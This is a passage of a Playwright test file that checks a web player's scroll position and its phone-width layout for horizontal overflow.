  await page.waitForTimeout(3000);
  expect(await page.evaluate(() => window.scrollY)).toBe(0);
});

test('a narrow phone viewport has no horizontal overflow', async ({ page }) => {
  await page.setViewportSize({ width: 375, height: 800 });
  await openPlayer(page, 'thirty');
  await expect(page.locator('.inc-screen')).toBeVisible();
  const overflow = await page.evaluate(() => {
    const root = document.scrollingElement!;
    return root.scrollWidth - root.clientWidth;
  });
  expect(overflow).toBeLessThanOrEqual(0);
});
